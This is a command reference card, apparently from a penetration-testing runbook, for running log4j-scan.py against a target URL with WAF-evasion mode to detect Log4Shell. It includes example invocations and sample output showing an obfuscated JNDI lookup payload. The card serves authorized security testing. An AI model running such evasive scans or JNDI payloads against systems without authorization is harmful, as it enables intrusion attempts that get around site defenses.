---
type: command
executor: bash
data: python3 log4j-scan.py -u $_TARGET_URL --waf-bypass
output: null
created_at: '2023-04-06T03:55:56.883887+00:00'
updated_at: '2023-04-06T03:55:56.890958+00:00'
platforms:
  - Linux
tags:
  - scanning
  - log4shell
  - bypass
verified: true
validated: true
---

# log4j-scan-waf-bypass

## Command

```bash
python3 log4j-scan.py -u $_TARGET_URL --waf-bypass
```

## Description

This command scans for Log4Shell while applying web application firewall evasion techniques, such as payload obfuscation and alternative encodings, to detect vulnerabilities behind protective layers like ModSecurity or Cloudflare.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The full URL of the target endpoint to scan (e.g., http://example.com/login) | Yes |
| --waf-bypass | Activates evasion modes, including case variations and encoding for JNDI payloads | Yes |
| -u | Flag to specify the target URL | Yes |

## Examples

### Basic Usage

```bash
python3 log4j-scan.py -u http://127.0.0.1:8080 --waf-bypass
```

### Advanced Usage

```bash
python3 log4j-scan.py -u https://target.com/api --waf-bypass --wait-time 5
```

## Expected Output

Similar to default scan but with bypass attempts noted:

```
[*] Testing URL: http://127.0.0.1:8080 with WAF bypass
[*] Applying obfuscation: ${JnDi:Ldap://...}
[+] Bypass successful! Vulnerable endpoint detected.
Exploit Test: Callback via encoded payload.
```

If blocked:

```
[-] WAF bypass failed; consider manual proxy inspection.
```

## Related

- [[procedures/Log4Shell Scanning Procedure]]
- [[commands/log4j-scan-run-all-tests]]
